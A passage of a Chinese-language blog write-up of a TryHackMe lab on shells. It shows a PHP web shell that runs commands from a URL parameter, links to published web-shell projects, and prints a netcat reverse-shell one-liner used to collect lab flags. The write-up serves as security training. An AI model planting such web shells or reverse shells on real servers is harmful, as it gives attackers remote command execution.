+<p>PHP Web Shell示例<br>让我们看一个PHP Web Shell 示例来了解这个过程是如何工作的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上述shell可以保存到以PHP为扩展名的文件中，例如shell.php ，然后由攻击者利用无限制文件上传(Unrestricted File Upload)、文件包含(File Inclusion)、命令注入(Command Injection)等漏洞， 或通过获取未经授权的访问将其上传到Web服务器。  </p>
+<p>在线web shell</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>——一个简约的单文件PHP web shell，允许远程命令执行。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/b374k/b374k">b374k shell</a> - 功能更丰富的PHP web shell，具有文件管理和命令执行等功能。</p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task7.png" alt="task7"></p>
+<h2 id="task8"><a href="#task8" class="headerlink" title="task8"></a>task8</h2><p>来俩练练手<br><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task8.png" alt="task7"></p>
+<p>第一问 我是用了反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc  10.10.250.106 443 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/hash.png" alt="task7"></p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/flag1.png" alt="task7"></p>
+<p>第二个事是简单写了一个php web shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>先看看whoami 看一下用户</p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/whoami.png" alt="task8"></p>
+<p>根据提示说 是在&#x2F;目录 我们ls &#x2F; 来看看文件</p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/ls.png" alt="task8"></p>
+<p>发现了flag cat &#x2F;flag.txt</p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/flag2.png" alt="task8"></p>
+<p>这个反弹shell和web shell是真的复杂 简单介绍到此</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://oasko.github.io">Asuna</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://oasko.github.io/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/">https://oasko.github.io/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://oasko.github.io" target="_blank">Asuna</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/tryhackme-linux/">tryhackme linux</a></div><div class="post-share"><div class="social-share" data-image="https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Asuna</div><div class="author-info-description">Do not go gentle into that good night</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">祝你青葱加鱼块 烧油又紫菜</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#task2"><span class="toc-number">1.</span> <span class="toc-text">task2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task3"><span class="toc-number">2.</span> <span class="toc-text">task3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task4"><span class="toc-number">3.</span> <span class="toc-text">task4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task5"><span class="toc-number">4.</span> <span class="toc-text">task5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Rlwrap"><span class="toc-number">4.1.</span> <span class="toc-text">1. Rlwrap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Ncat"><span class="toc-number">4.2.</span> <span class="toc-text">2. Ncat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Socat"><span class="toc-number">4.3.</span> <span class="toc-text">3. Socat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task6"><span class="toc-number">5.</span> <span class="toc-text">task6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash"><span class="toc-number">5.1.</span> <span class="toc-text">bash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%99%AE%E9%80%9A-Bash-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.1.1.</span> <span class="toc-text">1. 普通 Bash 反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Bash-%E8%AF%BB%E5%8F%96%E8%A1%8C-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.1.2.</span> <span class="toc-text">2. Bash 读取行 反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B8%A6%E6%9C%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6-196-%E7%9A%84-Bash-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.1.3.</span> <span class="toc-text">3. 带有文件描述符 196 的 Bash 反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6-5-%E7%9A%84-Bash-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.1.4.</span> <span class="toc-text">4. 使用文件描述符 5 的 Bash 反向 Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">5.2.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8-exec-%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0PHP%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.2.1.</span> <span class="toc-text">1. 使用 exec 函数实现PHP反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8shell-exec-%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0PHP%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.2.2.</span> <span class="toc-text">2. 使用shell_exec 函数实现PHP反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8-system-%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0PHP%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.2.3.</span> <span class="toc-text">3. 使用 system 函数实现PHP反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8-passthru-%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0PHP%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.2.4.</span> <span class="toc-text">4.使用 passthru 函数实现PHP反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8-popen-%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0PHP%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.2.5.</span> <span class="toc-text">5.使用 popen 函数实现PHP反向 Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">5.3.</span> <span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%87%E5%AF%BC%E5%87%BA%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%8E%B7%E5%8F%96-Python-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.3.1.</span> <span class="toc-text">1.通过导出环境变量获取 Python 反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8-subprocess-%E6%A8%A1%E5%9D%97%E7%9A%84-Python-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.3.2.</span> <span class="toc-text">2.使用 subprocess 模块的 Python 反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%AE%80%E7%9F%AD%E7%9A%84-Python-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">5.3.3.</span> <span class="toc-text">3.简短的 Python 反向 Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task7"><span class="toc-number">6.</span> <span class="toc-text">task7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task8"><span class="toc-number">7.</span> <span class="toc-text">task8</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/" title="tryhackme-shell：概括">tryhackme-shell：概括</a><time datetime="2025-03-14T10:21:41.000Z" title="发表于 2025-03-14 18:21:41">2025-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/13/tryhackme-Gobuster%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="tryhackme-Gobuster：基础知识">tryhackme-Gobuster：基础知识</a><time datetime="2025-03-13T12:26:29.000Z" title="发表于 2025-03-13 20:26:29">2025-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/13/tryhackme-hydra-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="tryhackme-hydra 基础知识">tryhackme-hydra 基础知识</a><time datetime="2025-03-13T11:24:47.000Z" title="发表于 2025-03-13 19:24:47">2025-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/11/tryhackme-JavaScript-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="tryhackme-JavaScript 基础知识">tryhackme-JavaScript 基础知识</a><time datetime="2025-03-11T12:58:32.000Z" title="发表于 2025-03-11 20:58:32">2025-03-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/11/tryhackme-SQL-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="tryhackme-SQL 基础知识">tryhackme-SQL 基础知识</a><time datetime="2025-03-11T07:47:29.000Z" title="发表于 2025-03-11 15:47:29">2025-03-11</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Asuna</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'oasko/Giscus-demo',
+      'data-repo-id': 'R_kgDONt6VLw',
+      'data-category-id': 'DIC_kwDONt6VL84CmPGu',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="7495004841" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
